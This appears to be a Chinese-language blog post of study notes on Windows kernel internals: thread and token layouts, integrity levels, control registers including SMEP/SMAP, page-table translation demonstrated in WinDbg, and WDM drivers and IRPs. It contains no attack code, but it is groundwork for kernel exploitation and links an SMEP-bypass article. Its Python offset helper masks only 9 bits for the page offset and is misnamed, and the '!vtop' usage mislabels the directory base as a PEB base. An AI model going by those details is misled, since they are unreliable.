<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">----------------- 0x0</span><br><span class="line">|               | </span><br><span class="line">|     TCB       | </span><br><span class="line">|               | </span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- 0x4b0</span><br><span class="line">|   IRPlist     | 指向正在處理的IRP</span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- 0x4b8</span><br><span class="line">|ThreadListEntry| </span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<p>TCB</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">----------------- 0x0</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- 0x58</span><br><span class="line">| Kernel Stack  | context switch 發生時負責記錄當前狀態的stack</span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- 0x90</span><br><span class="line">|    TrapFrame  | trap 時的frame，用來記錄進入kernel mode時所有register狀態</span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- 0xf0</span><br><span class="line">|      TEB      | 指向userspace</span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- 0x220</span><br><span class="line">|    Process    | 指向該thread所屬的process的ERPORCESS</span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- 0x232</span><br><span class="line">| Previous Mode | request從usermode還是kernel mode來的(0 is kernel, 1 is user)，kernel mode會少很多檢查</span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<h3 id="Integrity-Level"><a href="#Integrity-Level" class="headerlink" title="Integrity Level"></a>Integrity Level</h3><p>將 Object、Process等進行分級，共用六個等級，低level不能存取高level<br>untrusted, low, medium, high, system、Protected<br>我們正常的程式都是跑在medium</p>
<table>
<thead>
<tr>
<th>Level</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>Untrusted</td>
<td>Started by Anonymous group. Block most write access.</td>
</tr>
<tr>
<td>Low</td>
<td>Used by AppContainer. Block most write access to most object (files and registry) on system.</td>
</tr>
<tr>
<td>Medium</td>
<td>Used by normal application if UAC is enabled.</td>
</tr>
<tr>
<td>High</td>
<td>Used by administrative application when UAC is enabled.</td>
</tr>
<tr>
<td>System</td>
<td>Used by system services or system process.</td>
</tr>
<tr>
<td>Protected</td>
<td>Currently unused by default.</td>
</tr>
</tbody></table>
<h3 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h3><p>ACL:<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-control-lists">https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-control-lists</a><br>ACE:<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-control-entries">https://learn.microsoft.com/zh-tw/windows/win32/secauthz/access-control-entries</a><br>是存取控制項目ACE (ACL 可以有零個或多個 ACE。 每個 ACE 都會由指定的信任者控制或監視物件的存取)的清單</p>
<p>安全性實體物件的安全性描述項可以包含兩種類型的ACL：DACL和SACL</p>
<p><a target="_blank" rel="noopener" href="https://0xfocu5.github.io/posts/37e301d0/">https://0xfocu5.github.io/posts/37e301d0/</a></p>
<h3 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h3><p><a target="_blank" rel="noopener" href="https://0xfocu5.github.io/posts/37e301d0/">https://0xfocu5.github.io/posts/37e301d0/</a></p>
<h3 id="Access-Token"><a href="#Access-Token" class="headerlink" title="Access Token"></a>Access Token</h3><p>user登入windows時會拿到一組access token代表當前登入者<br>用來表示process security context<br>Windows會透過Token來判斷該物件是否可被存取及能做哪些操作</p>
<p>_TOKEN stuct</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">----------------- 0x0</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- </span><br><span class="line">|  Priviledges  | 該process擁有的priviledge (_SEP_TOKEN_PRIVILEDGE)</span><br><span class="line">-----------------</span><br><span class="line">| Audit Policy  | https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/audit-policy</span><br><span class="line">----------------- </span><br><span class="line">|     ...       | </span><br><span class="line">----------------- </span><br><span class="line">| UserAndGroup  | </span><br><span class="line">-----------------</span><br><span class="line">|     ...       | </span><br><span class="line">----------------- </span><br><span class="line">| Integrity     |</span><br><span class="line">|    LevelIndex | </span><br><span class="line">-----------------</span><br></pre></td></tr></table></figure>

<p>priviledge (_SEP_TOKEN_PRIVILEDGE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+-----------------+</span><br><span class="line">|    present      | 表示該token所具有的priviledge</span><br><span class="line">+-----------------+</span><br><span class="line">|     enable      | enable/disable</span><br><span class="line">+-----------------+</span><br><span class="line">|       ...       |</span><br><span class="line">+-----------------+</span><br></pre></td></tr></table></figure>

<ul>
<li>用 windbg 找 access token: <a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-token">https://learn.microsoft.com/en-us/windows-hardware/drivers/debuggercmds/-token</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/">https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/</a></p>
<h4 id="primary-token"><a href="#primary-token" class="headerlink" title="primary token"></a>primary token</h4><p>當thread與process對secure Object進行互動時使用<br>用於描述與process的secure context<br><a target="_blank" rel="noopener" href="https://rootclay.gitbook.io/windows-access-control/access-token">https://rootclay.gitbook.io/windows-access-control/access-token</a></p>
<h4 id="impersonation-token"><a href="#impersonation-token" class="headerlink" title="impersonation token"></a>impersonation token</h4><h3 id="control-register-CPU-Control"><a href="#control-register-CPU-Control" class="headerlink" title="control register(CPU Control)"></a>control register(CPU Control)</h3><p>負責控制及確定CPU模式、特性及行為，可以參考該docs的2.5(p.3069)<br><a target="_blank" rel="noopener" href="https://www.intel.com.tw/content/www/tw/zh/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html">docs</a></p>
<p><code>Control registers (CR0, CR1, CR2, CR3, and CR4; see Figure 2-7) determine operating mode of the processor and the characteristics of the currently executing task. </code></p>
<ul>
<li>CR2: 當發生page fault時，會儲存異常的Virtual address<br>( Contains the page-fault linear address. The linear address is caused a page fault.)</li>
<li>CR3: CPU用來做address translate會用到，該register存放當前process的page table physical address(PML4)</li>
<li>CR4: 用來啟用或調整CPU的各種進階功能和擴展<br>(Contains a group of flags that enable several architectural extensions, and indicate operating system or executive support for specific processor capabilities. Bits CR4[63:32] can only be used for IA-32e mode only features that are enabled after entering 64-bit mode. Bits CR4[63:32] do not have any effect outside of IA-32e mode.)</li>
<li>CR8: IRQL</li>
</ul>
<p><img src="https://hackmd.io/_uploads/SyxIH5EpNyx.png" alt="image"></p>
<p>每個bits 詳細功能也請直接參考該docs，其中最容易遇到的應該是CR4 20 21位的SMEP SMAP</p>
<h3 id="MMU-Memory-manager-unit"><a href="#MMU-Memory-manager-unit" class="headerlink" title="MMU(Memory manager unit)"></a>MMU(Memory manager unit)</h3><p>我們在process看到的記憶體是一串Virtual address，他透過映射的方式映射到Physical address(在Access的當下，CPU去將Virtual address轉成Physical address)<br>以下是Virtual Memory layout</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">------------------</span><br><span class="line">|                |</span><br><span class="line">| Kernel Space   | (Kernel, sys, page table ...)</span><br><span class="line">|                |</span><br><span class="line">------------------ 0xffff80000000</span><br><span class="line">|                |  This part is not canonical address</span><br><span class="line">|   No Access    |  因為AMD 64只實現 48 bits Virtual Address</span><br><span class="line">|                |</span><br><span class="line">------------------ 0x800000000000</span><br><span class="line">|   No Access    |</span><br><span class="line">------------------ 0x7fffffff0000</span><br><span class="line">|                |</span><br><span class="line">|  User Space    | (exe, dll, process)</span><br><span class="line">|                |</span><br><span class="line">------------------</span><br></pre></td></tr></table></figure>

<p>另外透過Virtual Address可實現Isolation Process，只要看你給的address有沒有在Virtual address裡面就可以，頂多影響到自己process擁有的Physicsl address<br>也解決了跳轉問題，程式只需要跳轉到Virtual address，硬體會幫你映射到對應的Physical address<br>你就不需要對Physical address直接進行操作了</p>
<h4 id="page"><a href="#page" class="headerlink" title="page"></a>page</h4><p>你可以想像是Memory的最小單位(若以segment作為memory單位太大了)<br>通常一page是4KB(0x1000)，不過具體大小由CPU決定<br>詳細可以參考這個<br><a target="_blank" rel="noopener" href="https://wiki.osdev.org/Paging">https://wiki.osdev.org/Paging</a></p>
<h4 id="page-table"><a href="#page-table" class="headerlink" title="page table"></a>page table</h4><p>儲存虛擬位址到實體位址的對映<br>每個表上的對應被稱作PTE(page table entry)</p>
<p><img src="https://hackmd.io/_uploads/B1ZnLBTEJx.png" alt="image"></p>
<h3 id="PTE"><a href="#PTE" class="headerlink" title="PTE"></a>PTE</h3><p>每個PTE長這樣<br>PFN存的就是offset(一個頁表0x1000，用3byte剛好表示完)</p>
<table>
<thead>
<tr>
<th>Name of bit</th>
<th>Meaning</th>
</tr>
</thead>
<tbody><tr>
<td>Nx</td>
<td>Non - execute</td>
</tr>
<tr>
<td>PFN</td>
<td>Page Frame Number</td>
</tr>
<tr>
<td>Ws</td>
<td>Write bit (software)</td>
</tr>
<tr>
<td>Cw</td>
<td>Copy on write</td>
</tr>
<tr>
<td>Gl</td>
<td>Global</td>
</tr>
<tr>
<td>L</td>
<td>Large Page</td>
</tr>
<tr>
<td>D</td>
<td>Dirty</td>
</tr>
<tr>
<td>A</td>
<td>Accessed</td>
</tr>
<tr>
<td>Cd</td>
<td>Cache disable</td>
</tr>
<tr>
<td>U&#x2F;S</td>
<td>User mode&#x2F;supervisor bit</td>
</tr>
<tr>
<td>W</td>
<td>Write bit (hardware)</td>
</tr>
<tr>
<td>V</td>
<td>Valid</td>
</tr>
</tbody></table>
<p><img src="https://hackmd.io/_uploads/BJcrPBaN1g.png" alt="image"></p>
<h4 id="demand-page"><a href="#demand-page" class="headerlink" title="demand page"></a>demand page</h4><p>當真正有去摸到那塊physical address<br>才會分配page給他<br>實際上R&#x2F;W&#x2F;X的時候才會分配physical address及建立PTE(但大多數API在alloc就會做讀寫了)</p>
<h4 id="page-fault"><a href="#page-fault" class="headerlink" title="page fault"></a>page fault</h4><p>訪問的Virtual address在Physical Address未被載入時會觸發此錯誤</p>
<h4 id="Swap-in-out"><a href="#Swap-in-out" class="headerlink" title="Swap in&#x2F;out"></a>Swap in&#x2F;out</h4><p>把很久沒用到的page swap到disk</p>
<h4 id="Virtual-address-to-Physical-address"><a href="#Virtual-address-to-Physical-address" class="headerlink" title="Virtual address to Physical address"></a>Virtual address to Physical address</h4><p><img src="https://hackmd.io/_uploads/B1ZnLBTEJx.png" alt="image"></p>
<p>假設要轉換這個0xffffffff8111c398<br>0b1111111111111111 | 111111111 | 111111110 | 000001000 | 100011100 | 001110011000<br>分別對應<br>第一段跟上述所說的一樣，AMD64只實現48bits，為規範address<br>接下來分別對應<br>PML4I    0b111111111    511<br>PDPI    0b111111110    510<br>PDI    0b000001000    8<br>PTI    0b100011100    284<br>Offset    0b001110011000    920</p>
<p>首先從 CR3 爬出 Page-Map Level-4 Table Base<br>第 PML4 個 Entry 紀載下一級頁表 PDP 的 Base<br>第 PDPT 個 Entry 紀載下一級頁表 PD 的 Base<br>第 PD 個 Entry 紀載下一級頁表 PT 的 Base<br>第 PT 個 Entry 紀載 Physical Page Frame Base<br>Physical Page Frame Base + Physical Page Offset 就完成了轉換</p>
<p>更詳細去拆解四個page table可以參考這篇<br><a target="_blank" rel="noopener" href="https://hackmd.io/@LJP/rkxtGgoIO">https://hackmd.io/@LJP/rkxtGgoIO</a></p>
<p>如何手算可以參考Physical Address<br><a target="_blank" rel="noopener" href="https://www.coresecurity.com/core-labs/articles/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-2-windows">https://www.coresecurity.com/core-labs/articles/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-2-windows</a></p>
<p>PS: 我要強調，這裡是從page table查到對應的page frame(等於找到page frame base)，在該page上通過offset去找實體記憶體位置</p>
<h4 id="gdb-demo"><a href="#gdb-demo" class="headerlink" title="gdb demo"></a>gdb demo</h4><p>首先一樣先attach上去kernel<br>我們來轉換nt好了<br>先對windbg下<code>dp nt</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fffff801`81c00040  cd09b400`0eba1f0e 685421cd`4c01b821</span><br></pre></td></tr></table></figure>
<p>來轉換 fffff801`81c00040</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0 cmd.exe</span><br><span class="line">PROCESS ffffac8d897a8080</span><br><span class="line">    SessionId: none  Cid: 193c    Peb: f0396d000  ParentCid: 1214</span><br><span class="line">    DirBase: 172636000  ObjectTable: ffffc2067ac51ec0  HandleCount:  70.</span><br><span class="line">    Image: cmd.exe</span><br></pre></td></tr></table></figure>

<p>首先是可以用vtop<br>用法是<br><code>!vtop &lt;PEB base&gt; &lt;Virtual Address&gt;</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !vtop 172636000 fffff8079a800040</span><br><span class="line">Amd64VtoP: Virt fffff8079a800040, pagedir 0000000172636000</span><br><span class="line">Amd64VtoP: PML4E 0000000172636f80</span><br><span class="line">Amd64VtoP: PDPE 00000000001d00f0</span><br><span class="line">Amd64VtoP: PDE 00000000002536a0</span><br><span class="line">Amd64VtoP: Large page mapped phys 0000000100200040</span><br><span class="line">Virtual address fffff8079a800040 translates to physical address 100200040.</span><br></pre></td></tr></table></figure>

<p>用 <code>!dp &lt;address&gt;</code>可以查看physical address上的值<br>將轉換出來的physical address查看一下發現值一樣，成功</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dp 100200040</span><br><span class="line">#100200040 cd09b400`0eba1f0e 685421cd`4c01b821</span><br></pre></td></tr></table></figure>

<p>不過當然這邊也手算一次，我們改用cmd.exe<br>先切換到cmd.exe process</p>
<p><code>.process /r /p ffffac8d897a8080</code><br>現在下dp ntdll就可以看到cmd.exe的ntdll</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq ntdll</span><br><span class="line">00007ffa`e2680000  00000003`00905a4d 0000ffff`00000004</span><br><span class="line">00007ffa`e2680010  00000000`000000b8 00000000`00000040</span><br><span class="line">00007ffa`e2680020  00000000`00000000 00000000`00000000</span><br><span class="line">00007ffa`e2680030  00000000`00000000 000000e0`00000000</span><br><span class="line">00007ffa`e2680040  cd09b400`0eba1f0e 685421cd`4c01b821</span><br><span class="line">00007ffa`e2680050  72676f72`70207369 6f6e6e61`63206d61</span><br><span class="line">00007ffa`e2680060  6e757220`65622074 20534f44`206e6920</span><br><span class="line">00007ffa`e2680070  0a0d0d2e`65646f6d 00000000`00000024</span><br></pre></td></tr></table></figure>
<p>通過ntdll去找PTE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !pte 00007ffae2680000</span><br><span class="line">                                           VA 00007ffae2680000</span><br><span class="line">PXE at FFFFC0E0703817F8    PPE at FFFFC0E0702FFF58    PDE at FFFFC0E05FFEB898    PTE at FFFFC0BFFD713400</span><br><span class="line">contains 0A0000013D174867  contains 0A0000013D177867  contains 0A0000013D178867  contains 810000010010D025</span><br><span class="line">pfn 13d174    ---DA--UWEV  pfn 13d177    ---DA--UWEV  pfn 13d178    ---DA--UWEV  pfn 10010d    ----A--UR-V</span><br></pre></td></tr></table></figure>

<p>試著轉換<code>00007ffae2680000</code></p>
<p>我寫了腳本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">PAtoVA_4page_cal</span>(<span class="params">address</span>):</span><br><span class="line">    PML4_offset = (address &gt;&gt; <span class="number">39</span>) &amp; <span class="number">0b111111111</span></span><br><span class="line">    PDPT_offset = (address &gt;&gt; <span class="number">30</span>) &amp; <span class="number">0b111111111</span></span><br><span class="line">    PD_offset = (address &gt;&gt; <span class="number">21</span>) &amp; <span class="number">0b111111111</span></span><br><span class="line">    PT_offset = (address &gt;&gt; <span class="number">12</span>) &amp; <span class="number">0b111111111</span></span><br><span class="line">    PhysicalAddress_offset = (address) &amp; <span class="number">0b111111111</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PML4_offset: &quot;</span>,<span class="built_in">hex</span>(PML4_offset))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PDPT_offset: &quot;</span>,<span class="built_in">hex</span>(PDPT_offset))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PD_offset: &quot;</span>,<span class="built_in">hex</span>(PD_offset))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PT_offset: &quot;</span>,<span class="built_in">hex</span>(PT_offset))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;PhysicalAddress_offset: &quot;</span>,<span class="built_in">hex</span>(PhysicalAddress_offset))</span><br></pre></td></tr></table></figure>
<p>轉換結果是<br>PML4_offset:  0xff<br>PDPT_offset:  0x1eb<br>PD_offset:  0x113<br>PT_offset:  0x80<br>PhysicalAddress_offset:  0x0</p>
<p>PML4就是這個 <code>DirBase: 172636000</code>(也是CR3存的值)<br>把他加上offset * 8後會找到該表上面的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dp 172636000+(0xff*8)</span><br><span class="line">#1726367f8 0a000001`72642867 00000000`00000000</span><br></pre></td></tr></table></figure>
<p>這就是第二層(PFN 0xa00000172642867)<br>記得去掉低12bits跟高1bits，剩下的PFN(0x172642000)<br>以此類推第二層</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dp 0x172642000+(0x1eb*8)</span><br><span class="line">#172642f58 0a000001`72545867 00000000`00000000</span><br><span class="line">#172642f68 00000000`00000000 00000000`00000000</span><br></pre></td></tr></table></figure>
<p>第三層(0x00172545000)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dp 0x00172545000+(0x113*8)</span><br><span class="line">#172545898 0a000002`25b46867 0a000001`72547867</span><br><span class="line">#1725458a8 00000000`00000000 00000000`00000000</span><br></pre></td></tr></table></figure>
<p>第四層(0x00225b46000)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dp 0x00225b46000+(0x80*8)</span><br><span class="line">#225b46400 81000001`0010d025 01000001`1a3a6025</span><br></pre></td></tr></table></figure>
<p>找到 page frame base (0x00010010d000)<br>最後加上offset 0x0就是physical address了(看到資料一樣代表成功了)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !dp 0x00010010d000</span><br><span class="line">#10010d000 00000003`00905a4d 0000ffff`00000004</span><br><span class="line">#10010d010 00000000`000000b8 00000000`00000040</span><br><span class="line">#10010d020 00000000`00000000 00000000`00000000</span><br><span class="line">#10010d030 00000000`00000000 000000e0`00000000</span><br><span class="line">#10010d040 cd09b400`0eba1f0e 685421cd`4c01b821</span><br><span class="line">#10010d050 72676f72`70207369 6f6e6e61`63206d61</span><br><span class="line">#10010d060 6e757220`65622074 20534f44`206e6920</span><br><span class="line">#10010d070 0a0d0d2e`65646f6d 00000000`00000024</span><br></pre></td></tr></table></figure>
<p>用vtop看的話也確認是正確的</p>
<h2 id="windows-driver"><a href="#windows-driver" class="headerlink" title="windows driver"></a>windows driver</h2><p>讓程式與device溝通的一個橋樑，通常可以利用syscall溝通<br>目前主流架構是Windows driver model</p>
<p>一個WDM載入device方式</p>
<ul>
<li>呼叫 IoCreateDevice 建立一個 Device</li>
<li>呼叫 IoCreateSymbolicLink 建立一個 Symbolic Link 連結到上一步建立的 Device，如此應用程式就可以透過呼叫 CreateFile 取得這個 Device 的 Handle</li>
<li>設定處理每個 IRP 請求的函數</li>
</ul>
<p>怎麼寫code可以參考<br><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/articles/10322132">https://ithelp.ithome.com.tw/articles/10322132</a></p>
<p>另外在逆向時MajorFunction可能只是index，可以參考這個</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#define IRP_MJ_CREATE                             0x00</span><br><span class="line">#define IRP_MJ_CREATE_NAMED_PIPE                  0x01</span><br><span class="line">#define IRP_MJ_CLOSE                              0x02</span><br><span class="line">#define IRP_MJ_READ                               0x03</span><br><span class="line">#define IRP_MJ_WRITE                              0x04</span><br><span class="line">#define IRP_MJ_QUERY_INFORMATION                  0x05</span><br><span class="line">#define IRP_MJ_SET_INFORMATION                    0x06</span><br><span class="line">#define IRP_MJ_QUERY_EA                           0x07</span><br><span class="line">#define IRP_MJ_SET_EA                             0x08</span><br><span class="line">#define IRP_MJ_FLUSH_BUFFERS                      0x09</span><br><span class="line">#define IRP_MJ_QUERY_VOLUME_INFORMATION           0x0a</span><br><span class="line">#define IRP_MJ_SET_VOLUME_INFORMATION             0x0b</span><br><span class="line">#define IRP_MJ_DIRECTORY_CONTROL                  0x0c</span><br><span class="line">#define IRP_MJ_FILE_SYSTEM_CONTROL                0x0d</span><br><span class="line">#define IRP_MJ_DEVICE_CONTROL                     0x0e</span><br><span class="line">#define IRP_MJ_INTERNAL_DEVICE_CONTROL            0x0f</span><br><span class="line">#define IRP_MJ_SHUTDOWN                           0x10</span><br><span class="line">#define IRP_MJ_LOCK_CONTROL                       0x11</span><br><span class="line">#define IRP_MJ_CLEANUP                            0x12</span><br><span class="line">#define IRP_MJ_CREATE_MAILSLOT                    0x13</span><br><span class="line">#define IRP_MJ_QUERY_SECURITY                     0x14</span><br><span class="line">#define IRP_MJ_SET_SECURITY                       0x15</span><br><span class="line">#define IRP_MJ_POWER                              0x16</span><br><span class="line">#define IRP_MJ_SYSTEM_CONTROL                     0x17</span><br><span class="line">#define IRP_MJ_DEVICE_CHANGE                      0x18</span><br><span class="line">#define IRP_MJ_QUERY_QUOTA                        0x19</span><br><span class="line">#define IRP_MJ_SET_QUOTA                          0x1a</span><br><span class="line">#define IRP_MJ_PNP                                0x1b</span><br><span class="line">#define IRP_MJ_PNP_POWER                          IRP_MJ_PNP      // Obsolete....</span><br><span class="line">#define IRP_MJ_MAXIMUM_FUNCTION                   0x1b</span><br></pre></td></tr></table></figure>

<p>那windows driver掛上去了，互動的流程是甚麼</p>
<ul>
<li>當User application呼叫DeviceIoControl，由I&#x2F;O manager建立並對windows driver送出IRP</li>
<li>windows driver收到IRP並進行處理</li>
<li>回傳IoCompleteRequest，告知I&#x2F;O manager完成</li>
</ul>
<p>如果要試著寫windows driver可以參考<br><a target="_blank" rel="noopener" href="https://www.alex-ionescu.com/">https://www.alex-ionescu.com/</a><br><a target="_blank" rel="noopener" href="https://www.apriorit.com/dev-blog/791-driver-windows-driver-model">https://www.apriorit.com/dev-blog/791-driver-windows-driver-model</a></p>
<p>Debug windows driver<br><a target="_blank" rel="noopener" href="https://ithelp.ithome.com.tw/m/articles/10326802">https://ithelp.ithome.com.tw/m/articles/10326802</a></p>
<h3 id="IRP"><a href="#IRP" class="headerlink" title="IRP"></a>IRP</h3><p>I&#x2F;O request packet<br><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp">https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_irp</a><br>Windows 中用於請求 I&#x2F;O 操作的資料結構。驅動程式可以使用 IRP 來與 Kernel 溝通，例如讀取文件或進行網路傳輸。開發者也可以透過發 IRP 給 I&#x2F;O Manager，並將 IRP 轉發給相應的驅動程式，從而執行對應的行為</p>
<p>IRP struct如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">------------------------</span><br><span class="line">|   Type   |   Size    |</span><br><span class="line">------------------------</span><br><span class="line">|         ...          |</span><br><span class="line">------------------------</span><br><span class="line">|         MDL          |</span><br><span class="line">------------------------</span><br><span class="line">|         ...          |</span><br><span class="line">------------------------</span><br><span class="line">|      IOstatus        |</span><br><span class="line">------------------------</span><br><span class="line">|         ...          |</span><br><span class="line">------------------------</span><br><span class="line">|     StackCount       |</span><br><span class="line">------------------------</span><br><span class="line">|   CurrentLocation    |</span><br><span class="line">------------------------</span><br><span class="line">|         ...          |</span><br><span class="line">------------------------</span><br><span class="line">|    CancelRoutine     |</span><br><span class="line">------------------------</span><br><span class="line">|      UserBuffer      |</span><br><span class="line">------------------------</span><br><span class="line">|   IO_STACK_LOCATION  |</span><br><span class="line">------------------------</span><br><span class="line">|         ...          |</span><br><span class="line">------------------------</span><br></pre></td></tr></table></figure>

